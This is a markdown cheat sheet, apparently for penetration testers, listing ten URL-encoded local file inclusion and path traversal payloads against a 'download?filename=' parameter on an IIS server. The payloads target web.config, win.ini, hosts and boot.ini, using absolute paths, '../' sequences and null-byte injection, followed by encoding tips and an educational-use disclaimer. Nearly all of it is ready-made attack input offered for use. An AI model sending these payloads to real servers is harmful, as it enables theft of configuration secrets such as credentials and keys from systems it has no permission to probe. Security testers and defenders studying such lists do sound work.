# LFI Exploitation - Targeting `web.config` on IIS Server

This table includes different attempts to exploit the Local File Inclusion (LFI) vulnerability to retrieve sensitive files (such as `web.config`) on a Microsoft IIS server. Each row explains the method and provides the corresponding URL-encoded test.

In these examples, the LFI is placed in the middle of a legit request which includes a token.

## LFI Exploit Attempts Table

| **Explanation**                                                        | **Test URL**                                                                                                                                                             |
|-------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **1. Absolute Path to `web.config` in `inetsrv` directory**             | `http://example.com/download?filename=C:%5Cwindows%5Csystem32%5Cinetsrv%5Cweb.config&amp;token=b8d84a63`                                                            |
| **2. Absolute Path to `web.config` in `wwwroot` directory**             | `http://example.com/download?filename=C:%5Cinetpub%5Cwwwroot%5Cweb.config&amp;token=b8d84a63`                                                                       |
| **3. Path Traversal to `web.config` in `inetsrv`**                      | `http://example.com/download?filename=..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Finetsrv%2Fweb.config&amp;token=b8d84a63`                                         |
| **4. Path Traversal to `web.config` in `wwwroot`**                      | `http://example.com/download?filename=..%2F..%2F..%2F..%2F..%2Finetpub%2Fwwwroot%2Fweb.config&amp;token=b8d84a63`                                                   |
| **5. Null Byte Injection to `web.config` in `inetsrv`**                 | `http://example.com/download?filename=..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Finetsrv%2Fweb.config%00&amp;token=b8d84a63`                                      |
| **6. Null Byte Injection to `web.config` in `wwwroot`**                 | `http://example.com/download?filename=..%2F..%2F..%2F..%2F..%2Finetpub%2Fwwwroot%2Fweb.config%00&amp;token=b8d84a63`                                                |
| **7. Testing with `win.ini` to Validate Path Traversal**                | `http://example.com/download?filename=C:%5Cwindows%5Cwin.ini&amp;token=b8d84a63`                                                                                    |
| **8. Testing with `hosts` file**                                        | `http://example.com/download?filename=C:%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts&amp;token=b8d84a63`                                                          |
| **9. Longer Traversal to `web.config` in `inetsrv`**                    | `http://example.com/download?filename=..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Finetsrv%2Fweb.config&amp;token=b8d84a63`                                    |
| **10. Testing with `boot.ini` to Validate LFI**                         | `http://example.com/download?filename=C:%5Cboot.ini&amp;token=b8d84a63`                                                                                            |

## Usage

Use these URL-encoded tests to validate the presence of LFI vulnerabilities and attempt to retrieve sensitive files from the IIS web server.

### Notes:
- `%5C` is the URL encoding for the backslash (`\`).
- `%2F` is the URL encoding for the forward slash (`/`).
- `%00` represents the null byte, useful for bypassing file extension filtering.
- Modify the number of `../` (dot-dot) sequences in path traversal attempts depending on the web application's file structure.

### Disclaimer

This information is for educational purposes only. Exploit vulnerabilities only in authorized environments or systems for which you have explicit permission.
